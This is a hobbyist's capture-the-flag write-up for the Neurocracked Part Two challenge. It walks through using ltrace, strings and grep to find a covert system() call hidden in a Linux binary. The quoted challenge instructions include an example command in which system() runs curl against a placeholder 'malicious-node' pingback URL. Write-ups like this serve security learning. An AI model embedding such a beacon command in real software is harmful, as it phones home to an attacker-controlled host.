---
title: "Neurocracked CTF Part Two: Whispers in the Shell"
seoTitle: "Taji Abdullah solves Neurocracked CTF Part Two"
seoDescription: "Taji Abdullah walks through how he solved Neurocracked CTF Part Two: Whispers in the Shell"
datePublished: Fri May 30 2025 01:13:39 GMT+0000 (Coordinated Universal Time)
cuid: cmba40htg000b08l7c5a93ye0
slug: neurocracked-ctf-part-two-whispers-in-the-shell
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1748559775076/abfd30f8-19e3-4f41-8813-6a836210bfd4.jpeg
tags: infosec-cjbi6apo9015yaywu2micx2eo, ctf, cybersecurity-1, information-security, ctf-writeup

---

Ok, Part 2 is definitely harder than Part 1, I have to admit this one made me think! Increasing difficulty should be expected as progression is made in the Neurocracked series. This write up will be slightly different from Part One as I will include my thought process as I figured things out. This was not as straight forward for me as Part One, but that’s what makes things fun and keeps things interesting.

## The Story

The story surrounding Part Two of the Neurocracked series expands from Part One, and I have to highly suggest reading it. The point of this write up is help solve issues and help someone after me capture the flag if they feel stuck. So I wont be providing any spoilers, the story can be [read here](https://www.cybernoweducation.com/post/neurocracked-ctf-part-two-whispers-in-the-shell).

## The Challenge

> ### **Your Task**
> 
> 1. **Use strings again to find the malicious call.**
>     
> 2. **One of the functions (strstr, strcmp, system, etc.) is being abused to execute a covert system call.**
>     
> 3. **Submit your flag in the following format: CTF{FUNCTION\_NAME::COMMAND}**
>     
> 
> ### **Included Files:**
> 
> * **neurolearn (ELF binary)**
>     
> * **README.txt with instructions**
>     

## The Instructions

> CTF Challenge #002 – "Whispers in the Shell"
> 
> Objective: Analyze the binary 'neurolearn' using ltrace to identify a suspicious function call.
> 
> Your goal is to:
> 
> * Identify which function is being abused
>     
> * Capture the exact system command it attempts to execute
>     
> 
> Example tools: ltrace ./neurolearn
> 
> Watch for calls like: system("curl http://...")
> 
> Flag format: CTF{FUNCTION\_NAME::COMMAND}
> 
> Example: CTF{system::curl [http://malicious-node/zombie/pingback](http://malicious-node/zombie/pingback)}
> 
> Good luck.

## **The Walk Through**

1. Download and extract the files provided in the story.
    
2. Open a terminal and navigate to the extracted files. You should see the names mentioned above in the “*Included Files*”.
    
    Deriving clues from the instructions, my next step was running this command in the terminal:
    
    ```bash
    ltrace ./neurolearn
    ```
    
    ltrace, however wasn’t installed on my system, so this command resulted in a prompt to install it:
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1748561865325/016251ce-2ad0-47ba-90ed-b7fabfa9ae46.png align="center")
    
    After ltrace was installed, the above command was completed, this is shown here from the above screenshot:
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1748564779257/d39a7962-eac2-443a-a413-2a0f1ec9ab38.png align="center")
    
    **Skip ahead to step 3 if you don’t care about my thought process to get back to the walk through!**
    
    This output wasn’t exactly helpful, so since I never used ltrace before I decided to check the man page by running this in the terminal:
    
    ```bash
    man ltrace
    ```
    
    If your’e unfamiliar with man pages, man is short for manual. So its basically like pulling out the instruction manual for whatever utility you want to use to read how to properly use it. Once again, keeping the instructions in mind for clues, I found a flag option in the manual that looked promising.
    
    Referring to this particular line from the instructions:
    
    > Watch for calls like: system("curl http://...")
    
    I decided to try running this command in the terminal:
    
    ```bash
    ltrace -S ./neurolearn
    ```
    
    This gave me much more output this time:
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1748563731438/a7dcda6c-e529-4271-af32-a1164bdd6f11.png align="center")
    
    I didn’t find this output to be much use either. Im going to be honest with you, this is where I was stumped for a while. I started trying different flags and combinations of flags from the man page and didn’t get anywhere for a while…then it hit me. There was a hint that wasn’t in the instructions! I remembered reading this from the story page:
    
    > **Use strings again to find the malicious call.**
    
    It was referring back to how Part One was solved!
    
3. My next move was to run this command:
    
    ```bash
    strings ./neurolearn | grep -Ei 'http|curl'
    ```
    
    Instead of sending the output from the strings command to a text file and then greping the file like I did in Part One, this command pipes the output directly to grep.
    
    **Skip ahead to step 4 if you don’t care about my thought process to get back to the walk through!**
    
    Once again deriving clues from the instructions, I gave grep a regex(regular expression) to search for:
    
    > Watch for calls like: system("curl http://...")
    
    This produced the line I was looking for! The next step is to find out what function is making the call:
    
    > Your goal is to:
    > 
    > * Identify which function is being abused
    >     
    
4. After a nice long while of pouring through all the output from all the terminal commands and copying what I thought were function names that could possibly be used, I finally was ready to call it quits for now, but decided to, as I have mentioned multiple times, “derive clues from the instructions”… I took the line I found in step 3 and format the flag:
    
    > CTF{system::INSERT\_LINE\_FOUND\_IN\_STEP\_3}
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1748566946115/46f3da21-2354-4b62-b8c0-f9967c77b95a.png align="center")
    

As I read the success screen, and thought about referring to the instructions for clues, I realized…Tyler Wall is a maniacal, diabolical, devious mutha fu….

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1748567314516/6c731ebd-0586-4b94-a989-784f85186ecb.gif align="center")